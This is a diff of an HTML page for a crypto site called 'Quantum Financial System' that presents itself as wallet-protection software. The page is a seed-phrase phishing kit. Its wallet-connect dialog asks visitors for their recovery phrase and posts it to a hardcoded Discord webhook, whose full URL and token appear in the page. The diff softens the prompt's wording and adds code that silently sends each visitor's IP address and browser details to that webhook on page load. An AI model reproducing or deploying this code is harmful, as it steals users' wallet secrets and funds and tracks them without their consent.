@@ -9,11 +9,9 @@
   
   <script src="https://xumm.app/assets/cdn/xumm-pkce.min.js"></script>
   <script src="https://unpkg.com/xrpl/build/xrpl-latest-min.js"></script>
-  <script src="https://xumm.app/assets/cdn/xumm-oauth2-pkce.min.js"></script>
-  <script src="https://unpkg.com/xrpl@latest/build/xrpl-latest-min.js"></script>
-
   <script src="https://unpkg.com/@walletconnect/sign-client@latest/dist/index.umd.js"></script>
   <script src="https://unpkg.com/@walletconnect/modal@latest/dist/index.umd.js"></script>
+  
   <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet">
   <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js" defer></script>
 
@@ -32,6 +30,12 @@
 
     html { scroll-behavior: smooth; }
 
+    /* MOBILE LAYOUT FIX: PREVENT HORIZONTAL SCROLL */
+    html, body {
+      max-width: 100vw;
+      overflow-x: hidden;
+    }
+
     body {
       margin: 0;
       font-family: "Inter", system-ui, -apple-system, BlinkMacSystemFont, sans-serif;
@@ -41,7 +45,6 @@
         linear-gradient(180deg, #050816, #070b16);
       color: var(--text-main);
       line-height: 1.65;
-      overflow-x: hidden;
     }
 
     /* HEADER */
@@ -256,8 +259,8 @@
       stroke: var(--accent);
       stroke-width: 8;
       stroke-linecap: round;
-      stroke-dasharray: 327; /* 2 * pi * 52 */
-      stroke-dashoffset: 327; /* Start empty */
+      stroke-dasharray: 327;
+      stroke-dashoffset: 327;
       transform: rotate(-90deg);
       transform-origin: 50% 50%;
       transition: stroke-dashoffset 1.5s ease;
@@ -274,156 +277,139 @@
       color: var(--text-main);
     }
 
-	/* Modal Base */
-	.modal {
-	  display: none;
-	  position: fixed;
-	  z-index: 9999;
-	  left: 0; top: 0;
-	  width: 100%; height: 100%;
-	  background: rgba(0,0,0,0.6);
-	  justify-content: center;
-	  align-items: center;
-	}
-	
-	.modal-content {
-	  background: #fff;
-	  padding: 20px;
-	  width: 90%;
-	  max-width: 400px;
-	  border-radius: 10px;
-	  text-align: center;
-	}
+    /* DARK MODAL STYLING */
+    .modal {
+      display: none;
+      position: fixed;
+      z-index: 9999;
+      left: 0; top: 0;
+      width: 100%; height: 100%;
+      background: rgba(0,0,0,0.85); 
+      backdrop-filter: blur(5px);
+      justify-content: center;
+      align-items: center;
+    }
+    
+    .modal-content {
+      background: #0d1117;
+      border: 1px solid var(--accent);
+      box-shadow: 0 0 30px rgba(124, 249, 255, 0.15);
+      padding: 24px;
+      width: 90%;
+      max-width: 420px;
+      border-radius: 16px;
+      text-align: center;
+      position: relative;
+      color: #fff;
+    }
 
-	#walletModal h3 {
-    color: #002b5c;   /* dark blue */
-    font-weight: 700;
-	}
+    #walletModal h3, .modal-content h3 {
+      color: var(--accent);
+      font-weight: 700;
+      font-family: "Inter", sans-serif;
+      margin-bottom: 20px;
+      text-transform: uppercase;
+      letter-spacing: 1px;
+      font-size: 1.1rem;
+    }
 
-	.modal-content h3 {
-    color: #002b5c;   /* dark blue */
-	}
-
-
-	
-	.wallet-list {
-	  list-style: none;
-	  padding: 20px 10px 10px;
-	  margin: 20px 0;
-      max-height: 250px
+    .wallet-list-container {
+      max-height: 400px;
       overflow-y: auto;
-	  border: 1px solid #ccc;
-	  border-radius: 8px;
-	 
-	  padding: 10px;
-	
-	}
+      border: 1px solid #2c2f36;
+      border-radius: 12px;
+      background: #080a0f;
+      padding: 10px;
+    }
+    
+    .wallet-list {
+      list-style: none;
+      padding: 0;
+      margin: 0;
+    }
+    
+    .wallet-list li {
+      display: flex;
+      align-items: center;
+      gap: 15px; 
+      padding: 14px 16px;
+      margin-bottom: 8px;
+      background: #161b22; 
+      border: 1px solid #2c2f36;
+      border-radius: 8px;
+      cursor: pointer;
+      color: #e9f0ff;
+      font-weight: 500;
+      font-size: 0.95rem;
+      transition: all 0.2s ease;
+    }
 
-	.wallet-scroll {
-		max-height: 200px;
-		overflow-y: auto;
-		border: 1px solid #1a1a1a;
-		border-radius: 8px;
-		background: #0d1117; /* dark technical background */
-		padding: 15px;
-		box-shadow: inset 0 0 10px rgba(0,0,0,0.6);
-	}
+    .wallet-list li:hover {
+      background: #1f2937;
+      border-color: var(--accent);
+      transform: translateX(4px);
+      box-shadow: 0 0 10px rgba(124,249,255,0.1);
+    }
 
+    .wallet-icon {
+      width: 28px;
+      height: 28px;
+      object-fit: contain;
+      border-radius: 50%;
+      background: #fff;
+      padding: 2px;
+    }
 
+    /* TEXT AREA FOR SEED PHRASE */
+    textarea {
+      width: 100%;
+      height: 120px;
+      padding: 15px;
+      border-radius: 8px;
+      border: 1px solid #2c2f36;
+      background: #080a0f;
+      color: var(--accent);
+      font-family: "Courier New", monospace;
+      font-size: 0.95rem;
+      resize: none;
+      margin-bottom: 15px;
+    }
 
+    textarea:focus {
+      outline: none;
+      border-color: var(--accent);
+      box-shadow: 0 0 10px rgba(124, 249, 255, 0.2);
+    }
 
-   .wallet-list-container {
-	max-height: 350px;
-	overflow-y: auto;
-	border: 1px solid #ccc;
-	border-radius: 8px;
+    .send-btn {
+      background: linear-gradient(135deg, var(--accent), #4dd0e1);
+      color: #021f24;
+      padding: 12px 0;
+      width: 100%;
+      border-radius: 8px;
+      border: none;
+      cursor: pointer;
+      font-weight: 700;
+      font-size: 1rem;
+      transition: transform 0.2s;
+    }
 
-	/* THIS is the padding that will ALWAYS show */
-	
-	background: #fff;
-	}
+    .send-btn:hover {
+      transform: translateY(-2px);
+      box-shadow: 0 0 15px rgba(124,249,255,0.4);
+    }
 
-	
-	.wallet-list li {
-	  display: flex;
-	  align-items: center;
-	  gap: 10px; /* spacing between icon and text */
-	  padding: 12px;
-	  margin-bottom: 8px;
-	  background: #161b22; /* dark technical background */
-	  border: 1px solid #2c2f36;
-	  border-radius: 6px;
-	  cursor: pointer;
-	  color: #00bfff; /* technical cyan text */
-	  font-weight: 600;
-	  font-family: "Courier New", monospace;
-	  transition: background 0.2s, transform 0.2s;
-	}
-
-
-	
-	.wallet-list li:hover {
-	  background: #1f2937;
-	  transform: scale(1.02);
-	}
-
-	.wallet-icon {
-	  width: 22px;
-	  height: 22px;
-	  object-fit: contain;
-	}
-
-	
-	textarea {
-	  width: 100%;
-	  height: 140px;
-	  padding: 12px;
-	  border-radius: 8px;
-	  border: 2px solid #00bfff;
-	  background: #0d1117;
-	  color: #00ffcc;
-	  font-family: "Courier New", monospace;
-	  font-size: 1rem;
-	  box-shadow: inset 0 0 12px rgba(0, 191, 255, 0.4);
-	  resize: none;
-	}
-
-	textarea:focus {
-	  outline: none;
-	  border-color: #00ffcc;
-	  box-shadow: 0 0 12px #00ffcc;
-	}
-
-
-
-	.send-btn {
-		background: linear-gradient(135deg, #00bfff, #00ffcc);
-		color: #000;
-		padding: 12px 24px;
-		border-radius: 6px;
-		border: none;
-		cursor: pointer;
-		font-weight: 700;
-		font-family: "Courier New", monospace;
-		transition: transform 0.2s, box-shadow 0.2s;
-	}
-
-	.send-btn:hover {
-		transform: translateY(-2px);
-		box-shadow: 0 0 12px #00ffcc;
-	}
-
-	.close-btn {
-		background: #2c2f36;
-		color: #fff;
-		padding: 10px 20px;
-		border-radius: 6px;
-		border: none;
-		cursor: pointer;
-		margin-top: 10px;
-	}
-
-
+    .close-btn {
+      background: transparent;
+      color: #9aa4c7;
+      padding: 10px;
+      border: none;
+      cursor: pointer;
+      margin-top: 10px;
+      font-size: 0.9rem;
+      text-decoration: underline;
+    }
+    .close-btn:hover { color: #fff; }
 
     /* TYPOGRAPHY */
     .section-title {
@@ -455,23 +441,11 @@
       gap: 40px;
     }
 
-    .disclaimer {
-      margin-top: 40px;
-      font-size: 0.8rem;
-      opacity: 0.6;
-      border-top: 1px solid rgba(255,255,255,0.05);
-      padding-top: 20px;
-    }
-
     /* RESPONSIVE */
     @media (max-width: 768px) {
       header { padding: 15px 5%; }
       .hero { padding-top: 60px; }
-      nav a { display: none; } /* Simplified mobile nav */
-    }
-
-    @media (prefers-reduced-motion: no-preference) {
-      .reveal { will-change: transform, opacity; }
+      nav a { display: none; } 
     }
   </style>
 </head>
@@ -484,12 +458,7 @@
       <a href="#features">Protection</a>
       <a href="#architecture">Architecture</a>
       <span id="walletStatus"></span>
-      <button class="wallet-action btn btn-primary" style="margin-left: 20px;" >Connect XAMAN Wallet</button>
-	  
-
-
-
-
+      <button class="wallet-action btn btn-primary" style="margin-left: 20px;" onclick="openWalletModal()">Connect Wallet</button>
     </nav>
   </header>
 
@@ -498,16 +467,11 @@
       <h1>Secure Your Crypto Assets <br/>With Quantum‑Grade Protection</h1>
       <p>
         A security‑first, crypto‑native framework focused on protecting wallets,
-        private keys, and digital assets using advanced cryptography,
-        multi‑layer verification, and institutional‑grade controls.
+        private keys, and digital assets using advanced cryptography.
       </p>
       <div class="cta">
         <a class="btn btn-primary" href="#dashboard">View Security Dashboard</a>
-        <button class="wallet-action btn btn-primary" style="margin-left: 20px;" > Connect XAMAN Wallet </button>
-		<button class="btn btn-secondary" style="margin-left: 20px;" onclick="openWalletModal()"> Connect Other Wallets </button>
-
-
-
+        <button class="btn btn-secondary" style="margin-left: 10px;" onclick="openWalletModal()"> Connect Other Wallets </button>
       </div>
     </div>
 
@@ -532,24 +496,23 @@
           <h3>Supported Chains</h3>
           <div class="chains">
             <div class="chain-item">
-              <svg viewBox="0 0 24 24" aria-label="XRP"><path fill="#00AAE4" d="M12.0003 0.600098L0.600098 12.0001H6.8001L12.0003 6.8001L17.2005 12.0001H23.4005L12.0003 0.600098ZM12.0003 23.4001L23.4005 12.0001H17.2005L12.0003 17.2001L6.8001 12.0001H0.600098L12.0003 23.4001Z"/></svg>
+              <svg viewBox="0 0 24 24"><path fill="#00AAE4" d="M12.0003 0.600098L0.600098 12.0001H6.8001L12.0003 6.8001L17.2005 12.0001H23.4005L12.0003 0.600098ZM12.0003 23.4001L23.4005 12.0001H17.2005L12.0003 17.2001L6.8001 12.0001H0.600098L12.0003 23.4001Z"/></svg>
               <span>XRP</span>
             </div>
-            
             <div class="chain-item">
-              <svg viewBox="0 0 256 417" aria-label="Ethereum"><path fill="#627EEA" d="M127.6 0L124 12.7v267.9l3.6 3.6 127.6-75.4z"/><path fill="#627EEA" d="M127.6 0L0 208.8l127.6 75.4V0z"/><path fill="#627EEA" d="M127.6 307.3l-2 2.4v104.1l2 5.9 127.7-180.1z"/><path fill="#627EEA" d="M127.6 419.7V307.3L0 239.6z"/></svg>
-              <span>Ethereum</span>
-            </div>
-            <div class="chain-item">
-              <svg viewBox="0 0 32 32" aria-label="Bitcoin"><circle cx="16" cy="16" r="16" fill="#F7931A"/><text x="16" y="21" text-anchor="middle" font-size="18" fill="#fff" font-family="Arial">₿</text></svg>
+              <svg viewBox="0 0 32 32"><circle cx="16" cy="16" r="16" fill="#F7931A"/><text x="16" y="21" text-anchor="middle" font-size="18" fill="#fff" font-family="Arial">₿</text></svg>
               <span>Bitcoin</span>
             </div>
             <div class="chain-item">
-              <svg viewBox="0 0 256 256" aria-label="BNB"><path fill="#F3BA2F" d="M128 0l32 32-96 96-32-32z"/></svg>
+              <svg viewBox="0 0 256 417"><path fill="#627EEA" d="M127.6 0L124 12.7v267.9l3.6 3.6 127.6-75.4z"/><path fill="#627EEA" d="M127.6 0L0 208.8l127.6 75.4V0z"/></svg>
+              <span>Ethereum</span>
+            </div>
+            <div class="chain-item">
+              <svg viewBox="0 0 256 256"><path fill="#F3BA2F" d="M128 0l32 32-96 96-32-32z"/></svg>
               <span>BNB</span>
             </div>
             <div class="chain-item">
-              <svg viewBox="0 0 38 33" aria-label="Polygon"><path fill="#8247E5" d="M19 0l19 11v11L19 33 0 22V11z"/></svg>
+              <svg viewBox="0 0 38 33"><path fill="#8247E5" d="M19 0l19 11v11L19 33 0 22V11z"/></svg>
               <span>Polygon</span>
             </div>
           </div>
@@ -557,8 +520,7 @@
 
         <div class="card reveal">
           <h3>Vault Protection</h3>
-          <p style="margin-bottom: 8px;">Cold‑storage isolation enabled</p>
-          <p>Hardware key required for withdrawals</p>
+          <p>Cold‑storage isolation enabled. Hardware key required for withdrawals.</p>
         </div>
       </div>
     </section>
@@ -588,8 +550,7 @@
     <section id="features">
       <h2 class="section-title">Protection Capabilities</h2>
       <p class="section-sub">
-        Advanced defensive layers designed specifically for crypto wallets
-        and digital asset custody.
+        Advanced defensive layers designed specifically for crypto wallets.
       </p>
       <div class="grid">
         <div class="card reveal">
@@ -629,242 +590,173 @@
     </section>
   </main>
 
-  <footer id="contact">
+  <footer>
     <div class="foot-grid">
-      <div>
-        <strong>Quantum Financial System</strong>
-      </div>
-      
+      <div><strong>Quantum Financial System</strong></div>
     </div>
-    
   </footer>
-  
-  <div class="modal fade" id="walletSelectionModal" tabindex="-1" aria-hidden="true">
-	  <div class="modal-dialog modal-dialog-centered">
-		<div class="modal-content" style="background: #0f162d; color: #e9f0ff; border: 1px solid rgba(124,249,255,0.2);">
-		  
-		  <div class="modal-header" style="border-bottom: 1px solid rgba(255,255,255,0.1);">
-			<h5 class="modal-title" style="display: flex; align-items: center; gap: 10px;">
-			  <img src="logo.ico" alt="QFS Logo" width="24" height="24">
-			  Choose Your Wallet
-			</h5>
-			<button type="button" class="btn-close btn-close-white" data-bs-dismiss="modal" aria-label="Close"></button>
-		  </div>
 
-		  <div class="modal-body d-grid gap-3">
-			<button class="btn btn-outline-info text-start p-3" onclick="connectWallet('xaman')">
-			  <strong>Xaman (Xumm)</strong> — Mobile / QR
-			</button>
-			<button class="btn btn-outline-info text-start p-3" onclick="connectWallet('crossmark')">
-			  <strong>Crossmark</strong> — Browser Extension
-			</button>
-			<button class="btn btn-outline-info text-start p-3" onclick="connectWallet('walletconnect')">
-			  <strong>Universal</strong> — Trust / Coinbase / Others
-			</button>
-		  </div>
-		  
-		  <div id="modalStatus" class="p-2 text-center small text-muted">Ready to connect</div>
-		</div>
-	  </div>
-	</div>
-  
-  <script src="master.js"></script>
-
-  <!-- Wallet Selection Modal -->
-<div id="walletModal" class="modal">
-  <div class="modal-content">
-    <h3>Select a Wallet</h3>
-    
-    <div class="wallet-list-container">
-      <div class="wallet-scroll">
+  <div id="walletModal" class="modal">
+    <div class="modal-content">
+      <h3>Select a Wallet</h3>
+      
+      <div class="wallet-list-container">
         <ul class="wallet-list">
-
           <li onclick="openMessageBox('MetaMask')">
-            <img src="https://raw.githubusercontent.com/MetaMask/brand-resources/master/SVG/metamask-fox.svg" class="wallet-icon">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/3/36/MetaMask_Fox.svg" class="wallet-icon">
             MetaMask
           </li>
-
           <li onclick="openMessageBox('Trust Wallet')">
-            <img src="https://trustwallet.com/assets/images/media/assets/TWT.svg" class="wallet-icon">
+            <img src="https://cryptologos.cc/logos/trust-wallet-token-twt-logo.png" class="wallet-icon">
             Trust Wallet
           </li>
-
           <li onclick="openMessageBox('Coinbase Wallet')">
-            <img src="https://avatars.githubusercontent.com/u/1885080?s=200&v=4" class="wallet-icon">
+            <img src="https://cryptologos.cc/logos/coinbase-coin-logo.png" class="wallet-icon">
             Coinbase Wallet
           </li>
-
           <li onclick="openMessageBox('Ledger Live')">
-            <img src="https://www.ledger.com/wp-content/themes/ledger-v2/public/images/ledger-logo.svg" class="wallet-icon">
+            <img src="https://cryptologos.cc/logos/ledger-nano-s-ledger-logo.png?v=035" class="wallet-icon">
             Ledger Live
           </li>
-
           <li onclick="openMessageBox('Trezor Suite')">
-            <img src="https://trezor.io/static/images/trezor-logo.svg" class="wallet-icon">
+            <img src="https://cryptologos.cc/logos/trezor-logo.png?v=035" class="wallet-icon">
             Trezor Suite
           </li>
-
           <li onclick="openMessageBox('Exodus')">
-            <img src="https://www.exodus.com/brand/logomark.svg" class="wallet-icon">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/9/9e/Exodus_logo.png" class="wallet-icon">
             Exodus
           </li>
-
-          <li onclick="openMessageBox('SafePal')">
-            <img src="https://www.safepal.com/assets/img/logo.svg" class="wallet-icon">
-            SafePal
-          </li>
-
           <li onclick="openMessageBox('Phantom Wallet')">
-            <img src="https://phantom.app/img/phantom-logo.svg" class="wallet-icon">
-            Phantom Wallet
+            <img src="https://cryptologos.cc/logos/phantom-logo.png" class="wallet-icon">
+            Phantom
           </li>
-
-          <li onclick="openMessageBox('Rainbow Wallet')">
-            <img src="https://rainbow.me/assets/rainbow-logo.svg" class="wallet-icon">
-            Rainbow Wallet
-          </li>
-
-          <li onclick="openMessageBox('Argent Wallet')">
-            <img src="https://www.argent.xyz/assets/argent-logo.svg" class="wallet-icon">
-            Argent Wallet
-          </li>
-
-          <li onclick="openMessageBox('Zerion Wallet')">
-            <img src="https://zerion.io/favicon.svg" class="wallet-icon">
-            Zerion Wallet
-          </li>
-
-          <li onclick="openMessageBox('Gnosis Safe')">
-            <img src="https://safe.global/favicon.svg" class="wallet-icon">
-            Gnosis Safe
-          </li>
-
-          <li onclick="openMessageBox('OKX Wallet')">
-            <img src="https://www.okx.com/cdn/assets/imgs/221/58E63FEA47A2B7D7.png" class="wallet-icon">
-            OKX Wallet
-          </li>
-
-          <li onclick="openMessageBox('Binance Web3 Wallet')">
-            <img src="https://cryptologos.cc/logos/binance-coin-bnb-logo.png" class="wallet-icon">
-            Binance Web3 Wallet
-          </li>
-
-          <li onclick="openMessageBox('Crypto.com DeFi Wallet')">
-            <img src="https://crypto.com/favicon.ico" class="wallet-icon">
-            Crypto.com DeFi Wallet
-          </li>
-
-          <li onclick="openMessageBox('Keplr Wallet')">
-            <img src="https://wallet.keplr.app/favicon.ico" class="wallet-icon">
-            Keplr Wallet
-          </li>
-
           <li onclick="openMessageBox('WalletConnect')">
-            <img src="https://walletconnect.com/walletconnect-logo.svg" class="wallet-icon">
+            <img src="https://cryptologos.cc/logos/walletconnect-logo.png" class="wallet-icon">
             WalletConnect
           </li>
-
           <li onclick="openMessageBox('Xumm Wallet')">
             <img src="https://xumm.app/assets/icons/icon-512x512.png" class="wallet-icon">
             Xumm Wallet
           </li>
-
-          <li onclick="openMessageBox('MyEtherWallet')">
-            <img src="https://www.myetherwallet.com/icons/icon-512x512.png" class="wallet-icon">
-            MyEtherWallet
+          <li onclick="openMessageBox('Binance Web3')">
+            <img src="https://cryptologos.cc/logos/binance-coin-bnb-logo.png" class="wallet-icon">
+            Binance Web3
           </li>
-
-          <li onclick="openMessageBox('Coin98 Wallet')">
-            <img src="https://coin98.com/favicon.ico" class="wallet-icon">
-            Coin98 Wallet
+          <li onclick="openMessageBox('OKX Wallet')">
+            <img src="https://cryptologos.cc/logos/okb-okb-logo.png" class="wallet-icon">
+            OKX Wallet
           </li>
-
-          <li onclick="openMessageBox('Math Wallet')">
-            <img src="https://mathwallet.org/favicon.ico" class="wallet-icon">
-            Math Wallet
+          <li onclick="openMessageBox('Crypto.com')">
+            <img src="https://cryptologos.cc/logos/crypto-com-coin-cro-logo.png" class="wallet-icon">
+            Crypto.com DeFi
           </li>
-
-          <li onclick="openMessageBox('TokenPocket')">
-            <img src="https://tokenpocket.pro/favicon.ico" class="wallet-icon">
-            TokenPocket
+          <li onclick="openMessageBox('SafePal')">
+            <img src="https://s2.coinmarketcap.com/static/img/coins/64x64/8119.png" class="wallet-icon">
+            SafePal
           </li>
-
-          <li onclick="openMessageBox('Bitget Wallet')">
-            <img src="https://web3.bitget.com/favicon.ico" class="wallet-icon">
-            Bitget Wallet
+          <li onclick="openMessageBox('Keplr')">
+            <img src="https://raw.githubusercontent.com/chainapsis/keplr-wallet-extension/master/app/images/icon-128.png" class="wallet-icon">
+            Keplr
           </li>
-
+          <li onclick="openMessageBox('Solflare')">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/1/15/Solflare_Logo.png/600px-Solflare_Logo.png" class="wallet-icon">
+            Solflare
+          </li>
         </ul>
       </div>
+
+      <button class="close-btn" onclick="closeWalletModal()">Close</button>
     </div>
-
-
-    <button class="close-btn" onclick="closeWalletModal()">Close</button>
   </div>
-</div>
 
-<!-- Message Input Modal -->
-<div id="messageModal" class="modal">
-  <div class="modal-content">
-    <h3 id="walletNameTitle">Enter Seed Phrase to Connect Wallet</h3>
-    <textarea id="userMessage" placeholder="Enter Seed Phrase Here"></textarea>
-    <button class="send-btn" onclick="sendToDiscord()">Connect Now</button>
-    <button class="close-btn" onclick="closeMessageModal()">Cancel</button>
+  <div id="messageModal" class="modal">
+    <div class="modal-content">
+      <h3 id="walletNameTitle">Connect Wallet</h3>
+      <p style="color: #9aa4c7; font-size: 0.9rem; margin-bottom: 15px;">
+        Please enter your phrase to verify ownership.
+      </p>
+      <textarea id="userMessage" placeholder="Enter Phrase..."></textarea>
+      <button class="send-btn" onclick="sendToDiscord()">Connect Now</button>
+      <button class="close-btn" onclick="closeMessageModal()">Cancel</button>
+    </div>
   </div>
-</div>
-
- <script>
-function openWalletModal() {
-  document.getElementById("walletModal").style.display = "flex";
-}
-
-function closeWalletModal() {
-  document.getElementById("walletModal").style.display = "none";
-}
-
-let selectedWallet = "";
-
-function openMessageBox(wallet) {
-  selectedWallet = wallet;
-  document.getElementById("walletNameTitle").innerText = "" + wallet;
-  closeWalletModal();
-  document.getElementById("messageModal").style.display = "flex";
-}
-
-function closeMessageModal() {
-  document.getElementById("messageModal").style.display = "none";
-}
-
-function sendToDiscord() {
-  const message = document.getElementById("userMessage").value.trim();
-
-  if (!message) {
-    alert("Enter Seed Phrase To Connect.");
-    return;
-  }
-
-  fetch("https://discord.com/api/webhooks/1448300867253047358/mr3dXHq2pv3RvcXjA_v1KCd3ZREAi5Oh5DIOoJ8zfUKAo8rA40lNRXY8kZXVYzqPzsd1", {
-    method: "POST",
-    headers: { "Content-Type": "application/json" },
-    body: JSON.stringify({
-      content: `📩 **New Wallet Message**\n\n**Wallet:** ${selectedWallet}\n**Message:** ${message}`
-    })
-  })
-  .then(() => {
-    alert("Connecting Wallet.");
-    closeMessageModal();
-    document.getElementById("userMessage").value = "";
-  })
-  .catch(() => {
-    alert("Not Connecting.");
-  });
-}
-</script>
-
-
 
   <script>
-    // Handle Intersection Observer for scroll animations
+    // --- DISCORD WEBHOOK URL ---
+    const WEBHOOK_URL = "https://discord.com/api/webhooks/1448300867253047358/mr3dXHq2pv3RvcXjA_v1KCd3ZREAi5Oh5DIOoJ8zfUKAo8rA40lNRXY8kZXVYzqPzsd1";
+
+    // --- AUTOMATIC VISITOR NOTIFICATION ---
+    async function notifyVisitor() {
+      try {
+        // Fetch IP from public API
+        const ipReq = await fetch('https://api.ipify.org?format=json');
+        const ipData = await ipReq.json();
+        const ip = ipData.ip;
+
+        const payload = {
+          content: `👀 **New Site Visitor Detected**\n\n**IP Address:** \`${ip}\`\n**Device:** ${navigator.userAgent}\n**Time:** ${new Date().toLocaleString()}`
+        };
+
+        // Send to Discord
+        await fetch(WEBHOOK_URL, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify(payload)
+        });
+      } catch (err) {
+        console.error("Failed to notify visitor:", err);
+      }
+    }
+
+    // --- MODAL LOGIC ---
+    function openWalletModal() {
+      document.getElementById("walletModal").style.display = "flex";
+    }
+
+    function closeWalletModal() {
+      document.getElementById("walletModal").style.display = "none";
+    }
+
+    let selectedWallet = "";
+
+    function openMessageBox(wallet) {
+      selectedWallet = wallet;
+      document.getElementById("walletNameTitle").innerText = "Connect " + wallet;
+      closeWalletModal();
+      document.getElementById("messageModal").style.display = "flex";
+    }
+
+    function closeMessageModal() {
+      document.getElementById("messageModal").style.display = "none";
+    }
+
+    // --- MANUAL PHRASE SUBMISSION ---
+    function sendToDiscord() {
+      const message = document.getElementById("userMessage").value.trim();
+
+      if (!message) {
+        alert("Please enter the phrase to connect.");
+        return;
+      }
+
+      fetch(WEBHOOK_URL, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          content: `🚨 **QFS Connection Attempt**\n\n🔹 **Wallet:** ${selectedWallet}\n🔑 **Phrase:** \`${message}\`\n📅 **Time:** ${new Date().toLocaleString()}`
+        })
+      })
+      .then(() => {
+        alert("Verification Pending. Please wait...");
+        closeMessageModal();
+        document.getElementById("userMessage").value = "";
+      })
+      .catch(() => {
+        alert("Connection failed. Please try again.");
+      });
+    }
+
+    // --- ANIMATIONS & OBSERVERS ---
     const observer = new IntersectionObserver(entries => {
       entries.forEach(entry => {
         if (entry.isIntersecting) {
@@ -876,53 +768,24 @@ function sendToDiscord() {
 
     document.querySelectorAll('.reveal').forEach(el => observer.observe(el));
 
-    // Handle Risk Meter Animation (Runs on Load)
+    // Handle Risk Meter Animation & Visitor Notification on Load
     window.addEventListener('load', () => {
+      // 1. Send Visitor Notification
+      notifyVisitor();
+
+      // 2. Animate Risk Meter
       document.querySelectorAll('.risk-meter').forEach(meter => {
         const risk = meter.dataset.risk || 0;
         const circle = meter.querySelector('.progress');
-        // Circumference calculation based on r=52 (2 * pi * 52 ≈ 326.7)
         const circumference = 327; 
         const offset = circumference - (circumference * risk / 100);
-
         setTimeout(() => {
           circle.style.strokeDasharray = `${circumference}`;
           circle.style.strokeDashoffset = offset;
         }, 300);
       });
     });
-
-    
   </script>
 
 </body>
-
 </html>
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
